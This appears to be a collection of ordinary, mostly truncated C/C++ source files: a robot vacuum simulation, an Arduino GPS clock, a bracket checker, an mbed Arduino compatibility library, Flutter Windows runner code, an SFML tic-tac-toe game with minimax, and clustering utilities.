    "#include <iostream>\r\n#include <fstream>\r\n#include <vector>\r\n#include <iomanip> \r\nusing namespace std;\r\n\r\nclass Robot {\r\nprotected:\r\n    int batteryLife;\r\n    int* cleaningArea;\r\n    int* cleaningTime;\r\n    int hiz[2];\r\n\r\npublic:\r\n    virtual void move(int hedefX, int hedefY) = 0;\r\n    Robot() {\r\n        \r\n        hiz[0] = 0;\r\n        hiz[1] = 1;\r\n        cleaningArea = new int;\r\n\t\tbatteryLife = 100;\r\n        cleaningTime = new int;\r\n    }\r\n\r\n    virtual ~Robot() {\r\n        delete cleaningArea;\r\n        delete cleaningTime;\r\n    }\r\n};\r\n\r\nclass RobotSweeper : protected Robot {\r\nprivate:\r\n\t\tint *currentX;\r\n\t\tint *currentY;\r\n\t\tint *currentBatteryLife;\r\n\t\tint *x2;\r\n\t\tint *y2;\r\n\t\tint *paspas_suyu;\t\r\n\r\npublic:\r\n    RobotSweeper() : currentX(new int(0)), currentY(new int(0)), currentBatteryLife(new int(100)), paspas_suyu(new int(0)), x2(new int(0)), y2(new int(0)) { }\r\n    ~RobotSweeper() {\r\n        delete currentX;\r\n        delete currentY;\r\n        delete currentBatteryLife;\r\n        delete x2;\r\n        delete y2;\r\n        delete paspas_suyu;\r\n    }\r\n  \tint &cleaningtime_getir(){\r\n\t\treturn *cleaningTime;\r\n\t\t}\r\n\tint &batterylife_getir(){\r\n\t\treturn *currentBatteryLife;\r\n\t\t}\r\n\r\n\tvoid vacuum(){\r\n\t\t\tif (*currentBatteryLife <= 5) {\r\n              \trobotu_sarj_etme();}\r\n            else{\r\n\t\t\t}\r\n\t\t\t}\t\r\n\t\t\t\r\n\tvoid mop() {\r\n    \tif (*paspas_suyu > 0 && *currentBatteryLife > 5) {\r\n        \tif (hiz[0] == 1) {\r\n            \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n\t\t\t\t\r\n            else {\r\n            \t*currentBatteryLife = (*currentBatteryLife )- (*currentBatteryLife * 0.03);\r\n\t\t\t\t*paspas_suyu -= 1;}\r\n        }\r\n        else{\r\n\t        robotu_sarj_etme();\r\n\t\t\t}\r\n    }\r\n\r\n\tvoid sarj_istasyonuna_gitme() {\r\n    \t*x2 = *currentX;\r\n    \t*y2 = *currentY;\r\n    \t*currentX = 0;\r\n    \t*currentY = 0;\r\n\t\t}\r\n\tvoid robotu_sarj_etme(){\r\n\t\tsarj_istasyonuna_gitme();\r\n\t\t*currentBatteryLife = 100;\r\n\t\t*cleaningTime +=10;\r\n\t\t(*currentX) = (*x2)  ; \r\n    \t(*currentY) =(*y2) ; \r\n\t}\r\n\r\n\t\r\n\tRobotSweeper& operator=(const RobotSweeper& n) {\r\n   \t\t\t*y2 = *n.y2;\r\n   \t\t\t*x2 = *n.x2;\r\n   \t\t\t*cleaningTime = *n.cleaningTime;\r\n   \t\t\t*paspas_suyu = *n.paspas_suyu;\r\n        \t*currentBatteryLife = *n.currentBatteryLife;\r\n        \t*currentX = *n.currentX;\r\n        \t*currentY = *n.currentY;\r\n     \t\treturn *this;\r\n   }\r\n    void move(int x,int y) override {\r\n\t\tif(*currentBatteryLife <= 5){\r\n\t\t\tcout << \"Hareket icin yeterli enerji yok\" << endl;\r\n\t\t\trobotu_sarj_etme();\r\n\t\t\t}\r\n\t\tint x_mesafe = x - (*currentX);\r\n\t\tint y_mesafe = y - (*currentY);\r\n\t\tif(x_mesafe>0 || y_mesafe > 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n\t\tif(x_mesafe<0 || currentY < 0) {\r\n\t\t\t(*currentY) += 1;\r\n\t\t}\r\n    \tif (x_mesafe < 0) {\r\n        \t(*currentX) -= 1;\r\n    \t}\r\n    \tif (x_mesafe > 0) {\r\n        (*currentX) += 1;\r\n    \t}\r\n    \tif (currentY < 0) {\r\n        \t(*currentY) -= 1;\r\n    \t}\r\n    \tif (currentY > 0) {\r\n        \t(*currentY) += 1;\r\n    \t}\r\n\r\n\t\tif (hiz[0] == 1) {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.01);\r\n        \t*cleaningTime += 2;}\t\t\r\n    \telse {\r\n        \t*currentBatteryLife = (*currentBatteryLife) - (*currentBatteryLife * 0.02);\r\n\t\t\t*cleaningTime += 1;\r\n\t\t\t}\r\n\t\t\t}\r\n\r\n};\r\nclass House{\r\n\tpublic:\r\n\t\tint x;\r\n\t\tint y;\r\n\t\tHouse() : x(0), y(0) {}\r\n\t\t\r\n};\r\nclass Room:public House{\r\npublic:\r\n\tint x1;\r\n\tint y1;\r\n\tint obstacleX;\r\n\tint obstacleY;\r\n\tRoom() : x1(0), y1(0),obstacleX(0),obstacleY(0){}\r\n\tint getRoom() const {\r\n        cout << \"Oda Bilgisi:\" << endl;\r\n        cout << \"Kordinatlar: (\" << x1 << \", \" << y1 << \")\" << std::endl;\r\n        cout << \"Engel Kordinatlari: (\" << obstacleX << \", \" << obstacleY << \")\" << std::endl;\r\n        return x1 + y1 + obstacleX + obstacleY;\r\n    }\r\n};\r\nclass Area:public House{\r\npublic:\r\n\tint edgeX;\r\n\tint edgeY;\r\n\tArea() : edgeX(0), edgeY(0){}\r\n\tint getArea() const {\r\n        std::cout << \"Konum Bilgisi:\" << std::endl;\r\n        std::cout << \"Engel Kordinatlari: (\" << edgeX << \", \" << edgeY << \")\" << std::endl;\r\n        return edgeX * edgeY;\r\n    }\r\n};\r\nvoid harita_dosyasi_okuma(const std::string& dosyaadi, std::vector<Room>& odalar, std::vector<std::pair<int, int>>& engel) {\r\n    ifstream inputFile(dosyaadi);\r\n    string obje_turu;\r\n    if (!inputFile) {\r\n        cerr << \"Dosya acilamadi !!\" << endl;\r\n        exit(EXIT_FAILURE);\r\n    }\r\n\r\n    while (inputFile >> obje_turu) {\r\n        if (obje_turu == \"Room\") {\r\n            Room oda;\r\n            inputFile >> oda.x1 >> oda.y1 >> oda.obstacleX >> oda.obstacleY;\r\n            odalar.push_back(oda);\r\n        } else if (obje_turu == \"Obstacle\") {\r\n            int engel_x;\r\n\t\t\tint engel_y;\r\n            inputFile >> engel_x >> engel_y;\r\n            engel.emplace_back(engel_x, engel_y);\r\n        }\r\n    }\r\n\r\n    inputFile.close();\r\n}\r\n\r\n\r\nvoid cleanArea(RobotSweeper& robot, int ilk_x, int ilk_y, int son_x, int son_y, const vector<pair<int, int>>& engeller) {\r\n    int& cleaningTime = robot.cleaningtime_getir();\r\n    int& batt",
    "// Including the required Arduino libraries\n#include <MD_Parola.h>\n#include <MD_MAX72xx.h>\n#include <SPI.h>\n#include <TinyGPS++.h>       // include TinyGPS++ library\n#include <TimeLib.h>         // include Arduino time library\n#include <SoftwareSerial.h>  // include software serial library\n\n// Uncomment according to your hardware type\n#define HARDWARE_TYPE MD_MAX72XX::FC16_HW\n//#define HARDWARE_TYPE MD_MAX72XX::GENERIC_HW\n\n// Defining size, and output pins\n#define MAX_DEVICES 8\n#define CS_PIN 9\n\nTinyGPSPlus gps;\n\n#define S_RX 3  // define software serial RX pin (No TX used)\n\nSoftwareSerial SoftSerial(S_RX, -1);  // configure SoftSerial library\n\n// Create a new instance of the MD_Parola class with hardware SPI connection\nMD_Parola myDisplay = MD_Parola(HARDWARE_TYPE, CS_PIN, MAX_DEVICES);\n\n#define time_offset -14400  // define a clock offset in seconds Note: (1 hour) ==> UTC + 1 (but in seconds)\n\n// variable definitions\nchar Time[] = \"TIME: 00:00:00\";\nchar Date[] = \"DATE: 00-00-2000\";\nbyte last_second, Second, Minute, Hour, Day, Month;\nint Year;\n\n// variable defaults\nbool timeIsSet = false;\n\nint h, m, s;\n\nint mill = 0;\n\nint timeout = 0;\nint lastMillis = 0;\nint lastCheck = 0;\n\nunsigned long currentMillis = 0;\n\nvolatile bool pulse = false;\n\n\nvoid setup() {\n  //Strictly utilized for debugging purposes.\n  Serial.begin(115200);\n\n  // Set the intensity (brightness) of the display (0-15)\n  myDisplay.begin();\n  myDisplay.setIntensity(0);\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_LEFT);\n\n  cli();  // Disable interrupts\n    // Set Timer2 to interrupt every 1 ms\n  TCCR2A = 0;  // Set entire TCCR2A register to 0\n  TCCR2B = 0;  // Same for TCCR2B\n  TCNT2 = 0;   // Initialize counter value to 0\n  // Set compare match register to desired timer count.\n  OCR2A = 249;  // 16MHz / 64 (prescaler) / 250 = 1000 Hz\n  // Enable CTC mode\n  TCCR2A |= (1 << WGM21);\n  // Set prescaler to 64 and start the timer\n  TCCR2B |= (1 << CS22);\n  // Enable timer compare interrupt\n  TIMSK2 |= (1 << OCIE2A);\n\n  // Enable global interrupts\n  sei();  // Enable interrupts\n\n  attachInterrupt(digitalPinToInterrupt(2), PPS, RISING);  // Attach interrupt to pin 2, triggering on rising edge\n}\n\n// Triggered every 1ms, using timer2 interrupts for accurate (enough) timing of the milliseconds.\nISR(TIMER2_COMPA_vect) {\n  if (timeIsSet) {\n    mill++;  //increment by 1;\n  }\n}\n\nvoid loop() {\n  if (timeIsSet == false) {  //Determine whether the GPS is needed to set the initial time.\n    timeIsSet = true;\n\n    Serial.print(\"Time is being set...\");\n\n    SoftSerial.begin(9600);  // initialize software serial at 9600 baud\n\n    getTime();\n\n    SoftSerial.end();  // End it so that it does not interfere later...\n\n    Serial.println(\"done!\");\n\n    myDisplay.setTextAlignment(PA_LEFT);\n\n    h = String(hour()).toInt();\n    m = String(minute()).toInt();\n    s = String(second()).toInt();\n\n    mill = 0;\n    timeout = 0;\n  }\n\n  if (pulse) {\n    pulse = false;\n    timeout = 0;\n    mill = 0;\n\n    s++;\n  }\n\n\n  /*if (timeout >= 5000) {\n    timeout = 0;\n    timeIsSet = false;\n    Serial.println(\"Timed out, acquiring new time from GPS...\");\n  }*/\n\n\n  ////////////////// WORK WITH TIME ///////////////////\n\n  if (s > 59) {\n    s = 0;\n    m++;\n    mill = 0;\n  }\n  if (m > 59) {\n    m = 0;\n    h++;\n    mill = 0;\n  }\n  if (h > 23) {\n    h = 0;\n    m = 0;\n    s = 0;\n    mill = 0;\n  }\n\n  printTime(String(h).toInt(), String(m).toInt(), String(s).toInt(), String(mill).toInt());\n}\n\nvoid printTime(int hr, int mn, int sc, int ms) {\n  String hour_str = String(hr);\n  String minute_str = String(mn);\n  String second_str = String(sc);\n  String millisecond_str = String(ms);\n\n  // Format the data to fit on the display better, and increase readability;\n\n  if (hr < 10) {\n    hour_str = \"0\" + hour_str;\n  }\n\n  if (mn < 10) {\n    minute_str = \"0\" + minute_str;\n  }\n\n  if (sc < 10) {\n    second_str = \"0\" + second_str;\n  }\n\n  if (ms < 10) {\n    millisecond_str = \"0\" + millisecond_str;\n  } else if (ms < 100) {\n    millisecond_str = \"00\" + millisecond_str;\n  }\n\n  String data = hour_str + \":\" + minute_str + \":\" + second_str + \":\" + millisecond_str;\n\n  myDisplay.print(data);  // Update the display with the relevant information.\n}\n\nvoid getTime() {\n  bool completed = false;\n\n  myDisplay.displayClear();\n  myDisplay.setTextAlignment(PA_CENTER);\n  myDisplay.print(\"Finding Sats.\");\n\n  while (!completed) {\n    while (SoftSerial.available() > 0) {\n      if (gps.encode(SoftSerial.read())) {\n\n        // get time from GPS module\n        if (gps.time.isValid()) {\n          Minute = gps.time.minute();\n          Second = gps.time.second();\n          Hour = gps.time.hour();\n        }\n\n        // set currentMillis UTC time\n        setTime(Hour, Minute, Second, Day, Month, Year);\n\n        // add the offset to get local time\n        adjustTime(time_offset);\n\n        // update time array\n        Time[12] = second() / 10 + '0';\n        Time[13] = second() % 10 + '0';\n        Time[9] = minute() / 10 + '0';\n        Time",
    "#include <iostream>\n#include <stack>\n#include <string>\n\nbool isMatchingPair(char character1, char character2) {\n    if (character1 == '(' && character2 == ')')\n        return true;\n    else if (character1 == '[' && character2 == ']')\n        return true;\n    else if (character1 == '{' && character2 == '}')\n        return true;\n    else if (character1 == '<' && character2 == '>')\n        return true;\n    else\n        return false;\n}\n\nbool areBracketsBalanced(const std::string& expression) {\n    std::stack<char> stack;\n    for (char bracket : expression) {\n        if (bracket == '(' || bracket == '[' || bracket == '{' || bracket == '<') {\n            stack.push(bracket);\n        } else if (bracket == ')' || bracket == ']' || bracket == '}' || bracket == '>') {\n            if (stack.empty() || !isMatchingPair(stack.top(), bracket)) {\n                return false;\n            } else {\n                stack.pop();\n            }\n        }\n    }\n    return stack.empty();\n}\n\nint main() {\n    std::string expression;\n    std::cout << \"Nh\u1eadp bi\u1ec3u th\u1ee9c to\u00e1n h\u1ecdc: \";\n    std::getline(std::cin, expression);\n\n    if (areBracketsBalanced(expression)) {\n        std::cout << \"C\u00e1c d\u1ea5u ngo\u1eb7c trong bi\u1ec3u th\u1ee9c \u0111\u01b0\u1ee3c s\u1eafp x\u1ebfp \u0111\u00fang.\" << std::endl;\n    } else {\n        std::cout << \"L\u1ed7i: C\u00e1c d\u1ea5u ngo\u1eb7c trong bi\u1ec3u th\u1ee9c \u0111\u01b0\u1ee3c s\u1eafp x\u1ebfp sai.\" << std::endl;\n    }\n\n    return 0;\n}\n",
    "/**\n * @section LICENSE\n *  Copyright (c) 2012\n *\n * Permission is hereby granted, free of charge, to any person obtaining a copy\n * of this software and associated documentation files (the \"Software\"), to deal\n * in the Software without restriction, including without limitation the rights\n * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n * copies of the Software, and to permit persons to whom the Software is\n * furnished to do so, subject to the following conditions:\n *\n * The above copyright notice and this permission notice shall be included in\n * all copies or substantial portions of the Software.\n *\n * THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n * THE SOFTWARE.\n *\n * @section DESCRIPTION\n *  This is a library for allowing the use of programs written for the Arduino\n *  with the mbed. This was started for use with the Gameduino shield Library.\n *  It is currently uncomplete and not fully tested, but I don't see myself spending time on it. \n *  See TODOs and check http://arduino.cc/en/Reference/HomePage for missing parts\n *\n * @file arduino.c\n *\n * Example:\n * @code\n * \n * #include \"mbed.h\"\n * #include \"arduino.h\"\n * \n * void setup(){\n * // setup code\n * }\n *\n *void loop(){\n * // loop code\n *}\n *\n * int main() {\n *   timer_start();\n *   setup();\n *   while(1) {\n *       loop();\n *   }\n * }\n * @endcode\n */\n #include \"arduino.h\"\n \n/*****************************************************  \n  Digital I/O\n \n    pinMode()- TODO\n    digitalWrite()- TODO\n    digitalRead()- TODO\n    \n******************************************************/\n \n/*****************************************************  \n  Analog I/O\n \n    analogReference() - TODO\n    analogRead() - TODO\n    analogWrite()-(PWM) - TODO\n    \n*****************************************************/\n \n/*****************************************************\n  Advanced I/O\n \n    tone() - TODO\n    noTone() - TODO\n    shiftOut() - TODO\n    shiftIn() - TODO\n    pulseIn() - TODO\n    \n*****************************************************/ \n \n/*****************************************************  \n  Time\n    \n    millis() - need to start timer first\n    micros() - need to start timer first\n    delay() - done by Macro\n    delayMicroseconds() - Done byMacro\n    \n*****************************************************/\n \nTimer arduino_timer;\n/** start the arduino_timer timer for millis() and micros() running.\n *\n * @param void\n */\nvoid timer_start(void) {\n    arduino_timer.start();\n}\n/** return a long for the amount of time since the timer was started in milliseconds.\n *\n * @param void\n */\nlong millis(void) {\n    return arduino_timer.read_ms();\n}\n/** return a long for the amount of time since the timer was started in microseconds.\n *\n * @param void\n */\nlong micros(void) {\n    return arduino_timer.read_us();\n}\n \n \n/*****************************************************\n  Maths\n \n    min()  - done by Macro\n    max()  - done by Macro\n    abs()  - done by Macro\n    constrain() - TODO\n    map() - TODO\n    pow() - implemented by including math.h\n    sqrt() - implemented by including math.h\n    \n*****************************************************/\n \n \n/*****************************************************\n  Trigonometry\n \n    sin() - implemented by including math.h\n    cos() - implemented by including math.h\n    tan() - implemented by including math.h\n    \n*****************************************************/\n \n/*****************************************************\n  Random Numbers\n \n    randomSeed()  - done by Macro\n    random() - function below\n    \n*****************************************************/\n \n/** generates a random number from 0 to defined number\n *\n * @param number maximum value for random number\n */\nint random(int number) {\n    return (rand()%number);\n}\n/** generates a random number between two numbers\n *\n * @param numberone minimum value for random number\n * @param numbertwo maximum value for random number\n */\nint random(int numberone, int numbertwo) {\n    int random = 0;\n    if ((numberone < 0) && (numbertwo < 0)) {\n        numberone = numberone * -1;\n        numbertwo = numbertwo * -1;\n        random = -1 * (rand()%(numberone + numbertwo));\n    }\n    if ((numbertwo < 0) && (numberone >= 0)) {\n        numbertwo = numbertwo * -1;\n        random = (rand()%(numberone + numbertwo)) - numbertwo;\n    }\n    if ((numberone < 0) && (numbertwo >= 0)) {\n        numberone = numberone * -1;\n        random = (rand()%(numberone + numbertwo)) - numberone;\n    } else {\n        random = (rand()%(numberone + numbertwo)) - min(numberone, numb",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "\ufeff#include <vector>\r\n#include <iostream>\r\n#include <SFML/Graphics.hpp>\r\n\r\n#define BLANK 0\r\n#define CROSS 1\r\n#define ZERO 2\r\n\r\n#define CROSS_WON 10\r\n#define ZERO_WON 11\r\n#define TIE 12\r\n#define GAME_NOT_OVER 13\r\n\r\nusing namespace sf;\r\nusing namespace std;\r\n\r\nint game_situation(const vector<int>& board)\r\n{\r\n    if (board[0] == CROSS && board[1] == CROSS && board[2] == CROSS ||\r\n        board[3] == CROSS && board[4] == CROSS && board[5] == CROSS ||\r\n        board[6] == CROSS && board[7] == CROSS && board[8] == CROSS ||\r\n        board[0] == CROSS && board[3] == CROSS && board[6] == CROSS ||\r\n        board[1] == CROSS && board[4] == CROSS && board[7] == CROSS ||\r\n        board[2] == CROSS && board[5] == CROSS && board[8] == CROSS ||\r\n        board[0] == CROSS && board[4] == CROSS && board[8] == CROSS ||\r\n        board[2] == CROSS && board[4] == CROSS && board[6] == CROSS)\r\n        return CROSS_WON;\r\n    if (board[0] == ZERO && board[1] == ZERO && board[2] == ZERO ||\r\n        board[3] == ZERO && board[4] == ZERO && board[5] == ZERO ||\r\n        board[6] == ZERO && board[7] == ZERO && board[8] == ZERO ||\r\n        board[0] == ZERO && board[3] == ZERO && board[6] == ZERO ||\r\n        board[1] == ZERO && board[4] == ZERO && board[7] == ZERO ||\r\n        board[2] == ZERO && board[5] == ZERO && board[8] == ZERO ||\r\n        board[0] == ZERO && board[4] == ZERO && board[8] == ZERO ||\r\n        board[2] == ZERO && board[4] == ZERO && board[6] == ZERO)\r\n        return ZERO_WON;\r\n    for (auto i : board)\r\n    {\r\n        if (i == BLANK) return GAME_NOT_OVER;\r\n    }\r\n    return TIE;\r\n}\r\n\r\nint minimax(vector<int>& board, int alpha, int beta, bool is_zero) \r\n{\r\n    int gs = game_situation(board);\r\n    if (gs == CROSS_WON) return 1000;\r\n    if (gs == ZERO_WON) return -1000;\r\n    if (gs == TIE) return 0;\r\n\r\n    if (is_zero)\r\n    {\r\n        int min_score = 1e9;\r\n        for (int i = 0; i < 9; i++)\r\n        {\r\n            if (board[i] != BLANK) continue;\r\n            vector<int> tmp = board;\r\n            tmp[i] = ZERO;\r\n            int cur_score = minimax(tmp, alpha, beta, false);\r\n            min_score = min(min_score, cur_score);\r\n            beta = min(beta, cur_score);\r\n            if (beta <= alpha) break;\r\n        }\r\n        return min_score;\r\n    }\r\n    else\r\n    {\r\n        int max_score = -1e9;\r\n        for (int i = 0; i < 9; i++)\r\n        {\r\n            if (board[i] != BLANK) continue;\r\n            vector<int> tmp = board;\r\n            tmp[i] = CROSS;\r\n            int cur_score = minimax(tmp, alpha, beta, true);\r\n            max_score = max(max_score, cur_score);\r\n            alpha = max(alpha, cur_score);\r\n            if (beta <= alpha) break;\r\n        }\r\n        return max_score;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    RenderWindow window(sf::VideoMode(850, 850), \"Tic Tac Toe\");\r\n    \r\n    Texture field_tex;\r\n    field_tex.loadFromFile(\"../image/field.png\");\r\n    Sprite field_spr;\r\n    field_spr.setTexture(field_tex);\r\n    \r\n    Texture cross_tex;\r\n    cross_tex.loadFromFile(\"../image/cross.png\");\r\n\r\n    Texture zero_tex;\r\n    zero_tex.loadFromFile(\"../image/zero.png\");\r\n\r\n    vector<int> board(9, BLANK);\r\n    int cnt = 0;\r\n    bool game_over = false;\r\n\r\n    while (window.isOpen())\r\n    {\r\n        int gs = game_situation(board);\r\n        if (gs != GAME_NOT_OVER && !game_over)\r\n        {\r\n            switch (gs)\r\n            {\n            case CROSS_WON: cout << \"CROSS WON\" << endl; break;\r\n            case ZERO_WON: cout << \"ZERO WON\" << endl; break;\r\n            case TIE: cout << \"TIE\" << endl; break;\r\n            }\r\n            game_over = true;\r\n        }\r\n        \r\n        if (cnt % 2 == 1)\r\n        {\r\n            int best_move, min_eval = 1e9;\r\n            for (int i = 0; i < 9; i++)\r\n            {\r\n                if (board[i] == BLANK)\r\n                {\r\n                    vector<int> tmp = board;\r\n                    tmp[i] = ZERO;\r\n                    int cur = minimax(tmp, -1e9, 1e9, false);\r\n                    if (cur < min_eval)\r\n                    {\r\n                        min_eval = cur;\r\n                        best_move = i;\r\n                    }\r\n                }\r\n            }\r\n            board[best_move] = ZERO;\r\n            cnt++;\r\n        }\r\n\r\n        sf::Event event;\r\n        while (window.pollEvent(event))\r\n        {\r\n            switch (event.type)\r\n            {\r\n            case Event::Closed: window.close(); break;\r\n            case Event::KeyPressed:\r\n                if (event.key.code == Keyboard::R)\r\n                {\r\n                    board = vector<int>(9, BLANK);\r\n                    cnt = 0; game_over = false;\r\n                    system(\"cls\");\r\n                }\r\n                break;\r\n            case Event::MouseButtonPressed:\r\n                if (cnt % 2 == 0)\r\n                {\r\n                    if (game_over) continue;\r\n                    Vector2f ev = Vector2f(event.mouseButton.x < 825 ? event.mouseButton.x : 825,\r\n                        event.mouseButton.y < 825 ? event.mous",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"exchange_ease\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"../../headers/general/cluster_utils.h\"\n\n\n/***************************\n * POINT\n ***************************/\n\nbool Point::operator<(const Point& other) const {\n        if (x == other.x) return y < other.y; \n        return x < other.x;\n    }\n\nbool Point::operator==(const Point& other) const {\n    bool val = (x == other.x);\n    return val && (y == other.y);\n}\n\nostream& operator<<(ostream& os, const Point& p) {\n    os << \"(\" << p.x << \", \" << p.y << \")\";\n    return os;\n}\n\n// La distancia es eucleidiana\ndouble dist(Point p, Point q) {\n    double dist = sqrt((p.x-q.x)*(p.x-q.x) + (p.y-q.y)*(p.y-q.y));\n    return dist;\n}\n\n/***************************\n * CLUSTER\n ***************************/\n\nostream& operator<<(ostream& os, const Cluster &c) {\n        os << \"{\";\n        for (const Point &point : c.points) \n            os << point;\n        os << \"}\";\n        return os;\n    }\n\ndouble dist(Cluster c1, Cluster c2)  {\n    return dist(c1.medoid, c2.medoid);\n}\n\n// C no vacio\nvoid setMedoid(Cluster &c) {\n    vector<Point> points = c.points;\n    if (c.points.size() <= 1) {\n        c.medoid = points[0];\n        return;\n    }\n    Point medoid;        // Trackea el candidato a medoide\n    double minRadius = DBL_MAX;\n    for (const Point &c_medoid : points) {   // Para cada punto elegido como posible medoide\n        double c_radius = 0.0;                  // Radio cobertor actual dado c_medoid como denominado medoide\n        for (const Point &point : points) {     // Calculamos su 